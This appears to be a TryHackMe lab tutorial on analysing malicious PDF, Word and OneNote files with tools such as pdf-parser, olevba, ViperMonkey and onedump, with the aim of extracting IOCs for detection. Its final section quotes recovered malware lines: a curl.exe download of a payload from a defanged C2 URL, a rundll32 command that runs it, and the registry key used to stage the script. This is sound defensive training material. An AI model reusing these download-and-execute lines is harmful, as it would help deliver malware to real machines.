components that can be found within one.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/28ed963583bceb260874792bfa569fe4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/28ed963583bceb260874792bfa569fe4.png)

# Pdf Documents

A
 PDF (Portable Document Format) file consists of a series of objects 
that are organized into a specific structure. Understanding the 
structure of a PDF file is important for analyzing and working with PDF 
documents. The following is a brief overview of the structure of a PDF 
file:

- **PDF Header:** The header is the first line in a
PDF file containing a file signature and version number. The file
signature is a sequence of characters that identifies the file as a PDF. The version number indicates the version of the PDF specification used
to create the document.

```c
%PDF-1.7
```

- **PDF Body:** The body of a PDF file contains a
series of objects that are organized in a specific structure. Each
object is identified by an object number and generation number, which
are used to uniquely identify the object within the document.

```c
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [3 0 R 4 0 R]
   /Count 2
>>
endobj
3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 5 0 R
>>
endobj
4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 6 0 R
>>
endobj

```

- **PDF Cross-reference Table**: The cross-reference table
is a table that provides a map of the locations of all the objects in
the PDF file. It is used to quickly locate objects within the file.

```c
xref
0 14
0000000000 65535 f
0000000015 00000 n
0000000263 00000 n
0000000009 00000 n
0000000057 00000 n
0000000297 00000 n
0000000202 00000 n
0000000399 00000 n
0000000426 00000 n
0000000501 00000 n
0000000528 00000 n
0000000604 00000 n
0000000631 00000 n
0000000707 00000 n
```

- **PDF Trailer:** The trailer is the last section in a PDF file and provides
information about the document, such as the location of the
cross-reference table, the size of the file, and any encryption or
security settings.

```c
trailer
<>
startxref
788
%%EOF

```

Now that we have explored different 
sections of the PDF, let’s explore some important keywords that have 
specific usage within a PDF.

| **PDF Keyword** | **Actions** |
| --- | --- |
| /JavaScript 
/JS | This keyword points to the JavaScript that will run when the document is opened. |
| /Names | File names that will most likely be referred to by the PDF itself. |
| /OpenAction
/AA (Additional Action) | This element's function is to carry out an action, such as running a script. |
| /EmbeddedFile | Shows other files embedded within the PDF file, such as scripts. |
| /URI 
/SubmitForm | Links to other URLs on the internet. |
| /Launch | This
 keyword is used to run embedded scripts within the PDF file itself or 
run new additional files that have been downloaded by the PDF. |

# Analyzing a simple.pdf Document

Open the terminal and go to the Desktop. Now, open the simple.pdf document in a notepad using the following command `notepad simple.pdf`.

It
 will open the PDF document in text format, and we will be able to 
recognize the PDF structure and its components present in the document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9bcb7d9991c6820d227da10731e70026.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9bcb7d9991c6820d227da10731e70026.png)

**Analyzing a PDF Document**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ea4f16ee10e3a396268c2dd2ab2e475.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ea4f16ee10e3a396268c2dd2ab2e475.png)

Let's
 examine the simple.pdf document and get introduced to the toolset that 
is used to get useful information out of the PDF document.

Open the terminal and go to the Desktop. Now, Open the `simple.pdf` 
document in a notepad using the following command `notepad simple.pdf`. It
 will open the PDF document in text format, and we will be able to 
recognize the PDF structure and its components present in the document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/241dee31f6467d82bc5d8841010c1168.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/241dee31f6467d82bc5d8841010c1168.png)

If we examine the document thoroughly, we can get the following details:

- PDF version
- Author Name
- Objects
- Keywords like JavaScript, Encode, Action
- Trailer

Almost similar kind of information is obtained using the strings command to extract the strings from the document.

# Tool: pdfid.py

Pdfid.py is used to summarise the objects/keywords found within the document. Let's try this command `pdfid.py simple.pdf`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/03616c961224d3428f5cdcfecbb609ff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/03616c961224d3428f5cdcfecbb609ff.png)

1. **Objects:** This document contains 18 objects.
2. **Stream:** This document contains 3 streams that we need to examine.
3. **JS / JavaScript:** This document contains 1 JavaScript and 1 JS instance.
4. **/OpenAction:** This indicates that an action will be performed when the document is
opened.. It could be running a JavaScript, downloading a payload, etc.
Therefore, this object is worth examining.

# Tool: pdf-parser.py

Pdf-parser.py is a very handy tool that is used to parse the PDF, search objects, filter, etc.

First, look at the help menu using this command `pdf-parser.py --help`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3e8e7305d27b8e37afe6a746005b6433.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3e8e7305d27b8e37afe6a746005b6433.png)

Let's use the command `pdf-parser.py simple.pdf`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d7a963b17a134936503b937fdf93b398.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d7a963b17a134936503b937fdf93b398.png)

This tool returns all the objects it finds within the PDF document. Let's use the search option to return only the objects that contain the OpenAction keyword using this command `pdf-parser.py --search OpenAction simple.pdf`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5a8fa92d20559b65b7d9672bb2df473d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5a8fa92d20559b65b7d9672bb2df473d.png)

The output shows object 1, which contains the keyword `OpenAction`, which is then referring to object 6. We can use the `--object` option to retrieve object 6. Let's use this command `pdf-parser.py --object 6 simple.pdf`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/08782db347b2b1b5ad6d4a583b347557.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/08782db347b2b1b5ad6d4a583b347557.png)

The
 above output shows object 6, which contains the JavaScript code. The 
last two results conclude that when this PDF document is opened, 
OpenAction will be triggered, resulting in the execution of the 
JavaScript code present in object 6.

We can also search for objects containing JavaScript keywords using this command `pdf-parser.py --search Javascript simple.pdf`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bcc84a750db29d18aa4b9f0a62bc5763.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bcc84a750db29d18aa4b9f0a62bc5763.png)

This returns the only object that points to the JavaScript code.

# Tool: peepdf

Peepdf
 is another tool for PDF analysis used to determine if there is any 
malicious element in the document. It also has an interactive option to 
interact with these objects. Let's first use this command `peepdf simple.pdf` to retrieve important information about the PDF document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d69394c65fe2dd8da9aaf29cdc1cfd04.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d69394c65fe2dd8da9aaf29cdc1cfd04.png)

The output shows some key information about the PDF, like:

- The hashes.
- The number of objects/streams/URLS found in the document.
- References to the objects.
- List of suspicious elements like JavaScript/OpenAction, etc.

Let's now use the interactive interface using this command `peepdf -i simple.pdf`. This will give us an interactive interface. Enter the `help` command, and we will get the output like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1fa401392e67a3c74ff1934b1e89e51e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1fa401392e67a3c74ff1934b1e89e51e.png)

Some of the key help options are highlighted. Let's use the `object` option to dump object 6:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cd8e813f1b7164c66f7c231acd057a31.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cd8e813f1b7164c66f7c231acd057a31.png)

This not only showed object 6 but also decoded it to show the actual JavaScript code.

Let's use the `extract js` option to view the JavaScript code. The `extract uri` option can also be used to extract URLs within the document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9fc75cb3c520d1250acd9677796036ff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9fc75cb3c520d1250acd9677796036ff.png)

Excellent, we were able to look at the PDF and extract the IOC from it. In the next task, we will look at a more complex JavaScript and see how to extract IOCs from the embedded JavaScript.

**Analyzing Malicious JavaScript**

Let's go through a scenario!!

After analyzing the malicious PDF document, a Junior SOC
 Analyst has extracted the embedded JavaScript and handed it over to you
 to have a detailed look at the code and see if you can find anything 
suspicious.

Your task as a SOC
 L2 analyst would be to examine the JavaScript code, deobfuscate if 
possible, and extract IOCs that could help in creating detection rules.

# Skimming through JS code

Go to the `/home/remnux/Javascript-code` directory and open the code in a text editor using the following command `notepad embedded-code.js`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d52c665f5f07c65f08e4673ec66b986c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d52c665f5f07c65f08e4673ec66b986c.png)

The code has the following characteristics:

- It's very complex and time-consuming to analyze.
- It contains randomly generated variable names which do not make any sense.
- It contains obfuscated code that needs to be deobfuscated.

# Box-Js to the Rescue

Box-js
 is a tool that performs the analysis and execution of
JavaScript code in a controlled environment. It was primarily designed 
to analyze malicious JavaScript files and understand their
behavior without risking the host system's security. The tool
creates a sandboxed environment where JavaScript code can be executed
and monitored.

To use `box-js`, run the command
`box-js embedded-code.js`; it will show the analysis as shown
below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4476b08f30b929e2bfc112869b1c4f68.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4476b08f30b929e2bfc112869b1c4f68.png)

This tool runs the JavaScript in the controlled environment and returns the IOCs it finds during
execution, as shown above.

It also creates a subfolder that contains useful files, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4ba74acaa7f3acd0b97b854878804736.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4ba74acaa7f3acd0b97b854878804736.png)

Go to the folder and explore the contents of the files.

In summary, `box-js` is one of the very useful tools that investigators use to examine complex JavaScript codes quickly.

**Office Docs Analysis**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c33f44e0a9a6960feed3dbae2978ab15.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c33f44e0a9a6960feed3dbae2978ab15.png)

Word
 Documents are files created using Microsoft Word, a popular 
word-processing software application. These files typically have a .doc 
or .docx file extension and can contain text, images, tables, charts, 
and other types of content. There are two Word document formats.

**Structured Storage Format**This
 type of Word document is a binary format used by Microsoft Word 
versions 97-2003. These files have extensions such as .doc, .ppt, .xml, 
etc.
**Office Open XML Format (OOXML)**This document type is an XML-formated
 document used by Microsoft Word versions 2007 and later. This file 
format is actually a zipped file containing all related data within the 
document. We can unzip these documents to see their content by just 
replacing the extension with .zip before unzipping. These files have 
extensions such as .docx, .docm, etc.
**What makes a Document Malicious**As
 we learned, a document can embed various elements, which can be used 
for malicious intent. Some of those elements are explained below:

- **Macros:** Macros are small VBA scripts that can be embedded in Word documents.
They can be used to automate tasks, but they can also be used to execute malicious code. Malicious macros can be used to download and install
malware on a user's system, steal sensitive information, or perform
other malicious actions.
- **Embedded objects:** Word
documents can contain embedded objects such as images, audio or video
files, or other types of files. Malicious Word documents can contain
embedded objects that are designed to exploit vulnerabilities in the
software used to open the file.
- **Links:** Malicious Word documents can contain links to websites that host malware or phishing pages designed to steal user credentials.
- **Exploits:** Word documents can contain code that exploits vulnerabilities in the
software used to open the file. These exploits can be used to download
and install malware on a user's system or to gain unauthorized access to sensitive data.
- **Hidden Content:** Malicious Word documents can contain hidden content that is not visible to the user but can be used to execute malicious code.

**Analyzing a Malicious Document**Let's
 take a suspicious-looking sample and examine it using tools in place to
 understand how to analyze and identify IOCs within a Word document. The
 sample `suspicious.doc` is placed at `/home/remnux/worddoc`.

**File Type Identification**We will use a file identification tool `trid` to confirm the file type. The output confirms that the file is indeed a Word document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/65662029fabfde2a1ba029b68884d088.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/65662029fabfde2a1ba029b68884d088.png)

# Tool: oleid

Oleid is used to extract basic information about the document to get a better understanding of its structure, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/30534538cd1492dbed09f5cc6c08d0e1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/30534538cd1492dbed09f5cc6c08d0e1.png)

The output shows the following information:

- This document name is suspicious.doc
- It is not encrypted
- It does contain VBA macros
- It's a Word Document

**Tool: olemeta**Olemeta is also used to extract the property information about the streams, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4d3bd43504f2436367a0958e0057948c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4d3bd43504f2436367a0958e0057948c.png)

Some key information we got from the output is:

- When the document was created / last saved.
- The author's Name.

**Tool: oletime**Oletime shows the creation/modification time of different stream objects present in the document as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f6ebfff7dc72a084bad1dbe4bddc28cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f6ebfff7dc72a084bad1dbe4bddc28cd.png)

**Tool: olemap**Olemap displays the details about different sectors of the file, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7388426e8309d5211f9ef9b576302a31.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7388426e8309d5211f9ef9b576302a31.png)

**Tool: olevba**This
 is an important tool that is widely used for analysis. Olevba extracts 
all the VBA objects it finds within the file and also shares the summary
 of the suspicious elements it finds, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7c586941aea2c4ff78dedc74472f4b7d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7c586941aea2c4ff78dedc74472f4b7d.png)

The above output shows the macros found within the document. The summary of the suspicious elements is shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b289787ff3d6c93ee0b75049c10e91df.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b289787ff3d6c93ee0b75049c10e91df.png)

The above summary shows that

- The document contains the code that will auto-execute when the user opens the document.
- It contains suspicious Base64 encoded strings.
- It also contains PowerShell code.

**Tool: Oledump.py**Oledump can be used to check if there are any macros embedded in the document streams. The letter `M/m` will be 
mentioned against the object stream, indicating that this stream is a 
macro, which needs to be checked.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5db251a23669fa6346c761ee0758fdf1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5db251a23669fa6346c761ee0758fdf1.png)

This shows that objects 7 and 8 contain the macros which we need to investigate further. We can also use the `--metadata or -M flag` to display the information about the document, most of which we already have obtained from the tools used above.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ab1343bdbf7714fe62f1f74a680da551.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ab1343bdbf7714fe62f1f74a680da551.png)

Let's select object 7 using the `-s` flag and see what macro is embedded in the document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a22d75b7f7f9963b511987a9343f90d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a22d75b7f7f9963b511987a9343f90d8.png)

If
 we examine this VBA code, it shows that it contains a PowerShell Script
 with base64 encoded string, which will execute when the document opens.
 Let's use another tool to examine this document

**Tool: ViperMonkey**ViperMonkey
 is a tool used for analyzing and emulating the behavior of malicious 
macros in Microsoft Office documents. Let's run this command against the
 document and see what it shows:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/906131af8bb0833c61217230be065146.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/906131af8bb0833c61217230be065146.png)

ViperMonkey runs and emulates the embedded macro in an isolated environment, trying to extract IOCs and useful information.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e339b276b46c0f875ed1b5666398a55f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e339b276b46c0f875ed1b5666398a55f.png)

Like the output above, the URL it has extracted is indeed a false positive. It has also extracted a PowerShell script that will be executed when a user opens the file.

We can use tools like CyberChef (placed on the Desktop) to deobfuscate the base64 encoded value, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7de33dd50f0a52901139db58ad8f08cc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7de33dd50f0a52901139db58ad8f08cc.png)

The base64 decoded result clearly shows the PowerShell code. It's now evident that this document would try to connect to the C2
 server on port 4444 to access the malware called stage2.exe. We can use
 another CyberChef recipe Extract URLs to extract the URL from the 
output, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6dcd642dbebbbe5169c22c7550dea46d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6dcd642dbebbbe5169c22c7550dea46d.png)

This is it.

We
 have found the IOC, which is a C2 server. From a SOC Analyst's 
perspective, we will move on to creating a detection rule on outbound 
traffic to detect if any host has communicated to this C2
 server in the past or if there is any connection in the future. If 
there is any communication observed, it means that the host has been 
compromised and needs immediate remedy.

OneNote

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7e9e6ab8d9605c07be5a2a319b1b9fd5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7e9e6ab8d9605c07be5a2a319b1b9fd5.png)

OneNote
 is a popular note-taking and collaboration tool developed by Microsoft.
 It allows users to create and organize digital notebooks containing 
various types of content, such as text, images, audio recordings, and 
file attachments. OneNote files are saved with a .one or .onenote 
extension.

To understand how different APT groups have started utilizing OneNote documents in their recent campaigns, let's look at `MalwareBazaar` - the online Malware database for researchers. We can search for OneNote malware by using the search `file_type:one` to display all OneNote documents.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/74d7a7e8a346f7bc2640477804a30be6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/74d7a7e8a346f7bc2640477804a30be6.png)

We
 will be using one of the documents from the above list to practice 
analyzing and see if we can extract some obfuscated code or any IOC.

In the attached VM, go to the path `/home/remnux/OneNoteDocs`, where the `invoice.one` is placed. Let's understand if there is any embedded code/IOC is present.

# File Identification

We will use the `trid` utility, which is used for file identification.. This confirms the file we are investigating is indeed a OneNote document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/65d261b8259927996c922a2cf2e9be31.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/65d261b8259927996c922a2cf2e9be31.png)

# Extracting Strings

We can use `strings` commands to see if there is anything interesting in the file like IP addresses, scripts, domain references, etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/015abe63f6e4c7cf20c065edfdab3940.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/015abe63f6e4c7cf20c065edfdab3940.png)

It
 looks like we are getting some references to some suspicious domains 
and some embedded code. Let's use another utility, onedump.py, to get 
the objects found in the document.

# Onedump Utility

Onedump is a stable tool used to extract and analyze OneNote documents. Let's first check the help options using this command `python3 onedump.py -h`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e18f6b8b32fd093c01d4083ae1831172.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e18f6b8b32fd093c01d4083ae1831172.png)

The above output shows some useful flags we can use with the tool. Let's now use this tool to analyze the `invoice.one` document without any flag using the command `python3 onedump.py invoice.one`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/03ba2aa6153791bb46a823501c0343a8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/03ba2aa6153791bb46a823501c0343a8.png)

The
 output shows that this document contains 6 objects. We can look at each
 object one by one. By the looks of it, we can confirm that objects 5 
and 6 seem to have HTML files.

Let's use the `-s` flag to select the 5th object and the `-d` flag to dump it on the screen.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/86ca4c98f71431d0d80f487c6ae3fdce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/86ca4c98f71431d0d80f487c6ae3fdce.png)

This file looks like HTML code containing obfuscated JavaScript and VBScript. We will save it by using this command `python3 onedump.py -s 5 -d invoice.one > obj5` and open it in notepad using the command `notepad obj5`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2b7c7c530b016729260c5cec680786e6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2b7c7c530b016729260c5cec680786e6.png)

This code has some interesting obfuscated code. The code clearly uses a replace function to remove the string `5&` from the obfuscated. We will use CyberChef to replace and clear the code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2485161ee7feee935dd957cdb54e676b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2485161ee7feee935dd957cdb54e676b.png)

**Note:** CyberChef is placed on the Desktop.

Now the code makes more sense and it contains some important IOCs. Let’s summarize the findings:

- The OneNote document contains two suspicious HTML objects.
- This script contains the obfuscated code, and it's cleared out by removing `5&`.
- The script is writing the deobfuscated script to the registry entry `HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values`
- Runs the script.
- C2 domain is `hxxps[:]//unitedmedicalspecialties[.]com/T1Gpp/OI.png`.
- Downloads the payload using cURL and outputs the payload into index1.png → `curl.exe --output C:\\\\ProgramData\\\\index1.png --url " + url, 0);`
- Sleeps for 15000 ms using `sleep(15000)`.
- Runs the payload using rundll32 → `shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);`.
- Deletes the registry entry.
